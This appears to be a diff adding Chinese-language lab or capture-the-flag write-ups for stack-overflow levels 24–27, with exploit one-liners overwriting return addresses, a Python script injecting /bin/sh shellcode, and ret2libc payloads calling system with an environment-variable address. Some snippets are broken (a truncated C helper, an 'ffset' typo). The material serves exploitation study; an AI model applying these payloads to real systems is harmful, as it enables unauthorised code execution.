@@ -277,6 +277,100 @@ stack-overflow-overwrite-function-pointer
 成功得到flag
 ![](img/level23.png)
 
+### level24
+
+stack-overflow-flow-change
+
+观察程序，利用gets函数覆盖返回地址，到win函数的地址，win函数地址为0x80483f4，查看main函数汇编代码，通过测试输入的位置，用$ebp-输入起始地址+4，就是返回地址的开始点，于是输入如下命令：
+```
+echo -e `python -c "'A'*(0x40+12)+'\xf4'+'\x83'+'\x04'+'\x08'"`|./flag24
+```
+![](img/level24.png)
+
+### level24.odd
+
+stack-overflow-flow-change
+
+同level24，利用栈溢出覆盖返回地址，同时注意不能改变ecx，即ebp-0x4位置的值，具体命令如下
+```
+echo -e `python -c "print 'A'*(0x44)+'\x50\xf6\xff\xbf'+'A'*4+'\x3b\x84\x04\x08'"`|./flag24.odd
+```
+得到flag
+![](img/level24_odd.png)
+
+
+### level25
+
+stack-overflow-shellcode
+
+通过gets溢出覆盖eip地址，将其改为网上查找到的shellcode代码，修改后的python文件如下，其中pad填充至eip，EIP为新EIP地址，后面为shellcode代码
+```python
+import struct
+pad = "\x41" * 76
+EIP = struct.pack("I", 0xbffff650)
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+NOP = "\x90" * 100
+print pad + EIP + NOP + shellcode
+```
+![](img/level25.png)
+
+
+### level26
+
+stack-overflow-change-ret
+
+题目对于返回地址做了限制，于是通过调用system的返回地址，设置环境变量，得到flag
+具体代码如下：
+`export TEST="getflag26"`
+新建get.c文件
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main( int argc, char** argv){
+                char *ptr;
+                if(argc < 3) {
+                                printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+                                exit(0);
+                }
+                ptr = getenv(argv[1]); /* get env var location */
+                ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+                printf("%s will be at %p\n", argv[1], ptr);
+```
+执行
+` ./a.out TEST /home/flag26/flag26`
+得到TEST的env地址
+`TEST will be at 0xbffffef5`
+接着通过让system+env地址覆盖，得到flag
+`python -c "print 'a'*80 + '\xa0\x3d\xe5\xb7\xd0\x79\xe4\xb7\xf5\xfe\xff\xbf'"|/home/flag26/flag26`
+![](img/flag26.png)
+
+
+### level27
+
+stack-overflow-call-jmp
+
+程序对返回地址做了进一步限制，由于新增了strdup代码，于是可以利用eax更改返回值
+通过gdb调试，得到eax地址：0x08048550
+得到system地址：0xb7e53da0
+定义env：TEST，同上题，得到地址：\xf2\xfe\xff\xbf
+
+通过python函数定义payload：
+```
+ffset = 76
+nopsled = "\x90" * offset
+ret = "\x53\x85\x04\x08"
+system = "\xa0\x3d\xe5\xb7"
+system_argv = "\xf2\xfe\xff\xbf"
+print nopsled + "FAKE" + ret + system + "FAKE" + system_argv
+```
+
+通过`python test.py|/home/flag27/flag27`得到flag
+![](img/level27.png)
+
+
+### level 28
+
 ## 三、 实验结果
 
 参见实验内容
